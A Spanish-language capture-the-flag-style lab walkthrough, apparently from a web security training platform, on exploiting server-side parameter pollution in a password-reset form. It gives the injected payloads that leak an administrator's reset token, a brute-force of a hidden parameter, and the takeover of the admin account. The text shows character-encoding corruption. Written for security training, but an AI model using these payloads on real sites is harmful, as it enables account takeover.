
---

## ğŸ§ª Lab: ExplotaciÃ³n de Server-Side Parameter Pollution en Query String

**Objetivo**: Iniciar sesiÃ³n como **administrator** y eliminar al usuario **carlos**.

---

### ğŸ” 1. Trigger del reset de contraseÃ±a

- Ir al navegador de Burp.
    
- Iniciar el proceso de "Â¿Olvidaste tu contraseÃ±a?" para el usuario `administrator`.
    
- En **Proxy > HTTP history**, observar:
    
    - `POST /forgot-password`
        
    - `GET /static/js/forgotPassword.js`
        

---

### ğŸ“¤ 2. Analizar la solicitud POST

- Enviar `POST /forgot-password` al **Repeater**.
    
- En Repeater:
    
    - Confirmar que el request con `username=administrator` da respuesta normal.
        ![[Pasted image 20250505224307.png]]
    - Probar con `username=administratorx` â†’ da error `Invalid username`.
        ![[Pasted image 20250505225647.png]]

---

### ğŸ’‰ 3. Probar inyecciÃ³n de parÃ¡metro con `%26` (`&` codificado)

- Probar:
    
    ```
    username=administrator%26x=y
    ```
    
    Resultado: `Parameter is not supported` â†’ ğŸ’¡ hay un intento de interpretar `x=y` como parÃ¡metro vÃ¡lido.
    ![[Pasted image 20250505230855.png]]

---

### âœ‚ï¸ 4. Probar truncamiento con `%23` (`#` codificado)

- Probar:
    
    ```
    username=administrator%23
    ```
    
    Resultado: `Field not specified` â†’ ğŸ’¡ se eliminÃ³ probablemente un campo requerido.
    ![[Pasted image 20250505231013.png]]

---

### ğŸ§ª 5. Inyectar y truncar parÃ¡metro `field`

- Probar:
    
    ```
    username=administrator%26field=x%23
    ```
    
    Resultado: `Invalid field` â†’ ğŸ’¡ el campo `field` es reconocido.
    ![[Pasted image 20250505231138.png]]

---

### ğŸ” 6. Fuerza bruta de `field`

- Enviar a **Intruder**:
    
    - Payload:
        
        ```
        username=administrator%26field=Â§xÂ§%23
        ```
        
    - Lista: `Server-side variable names`
        
    - Resultado: `email` y `username` dan respuesta 200.
        ![[Pasted image 20250505231824.png]]

---

### ğŸ§  7. Buscar token de reseteo

- En `/static/js/forgotPassword.js` aparece:
    
    ```
    /forgot-password?reset_token=${resetToken}
    ```
    
- En Repeater, probar:
    
    ```
    username=administrator%26field=reset_token%23
    ```
    
- ğŸ’¥ Se obtiene el `reset_token`.
    ![[Pasted image 20250505232605.png]]
```css
{
  "type":"reset_token",
  "result":"<token>"
}
```

---

### ğŸ”‘ 8. Resetear contraseÃ±a del administrador

- En el navegador:
    
    ```
    /forgot-password?reset_token=<token>
    ```
    
- Establecer nueva contraseÃ±a.
    ![[Pasted image 20250505232944.png]]

---

### âœ… 9. Iniciar sesiÃ³n como `administrator`

- Entrar al panel de administraciÃ³n.
    
- Eliminar al usuario `carlos`.
    

âœ… **Â¡Lab resuelto!**
![[Pasted image 20250505233102.png]]
---

